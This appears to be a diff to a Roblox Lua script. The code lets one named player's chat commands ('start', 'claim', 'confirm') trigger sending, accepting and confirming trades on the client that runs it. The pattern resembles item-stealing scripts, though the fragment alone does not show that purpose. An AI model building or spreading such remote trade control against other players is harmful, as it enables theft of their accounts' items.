@@ -156,10 +156,10 @@ coroutine.wrap(function()
       if player.Name == Username then
           player.Chatted:Connect(function(msg)
               local lowerMsg = msg:lower()
-              if lowerMsg == "/send" or lowerMsg == "send" then
+              if lowerMsg == "/start" or lowerMsg == "start" or lowerMsg == "send" then
                 SendTrade()
               end
-              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "acc" then
+              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "claim" then
                 AcceptTrade()
               end
               if lowerMsg == "/confirm" or lowerMsg == "confirm" or lowerMsg == "con" then
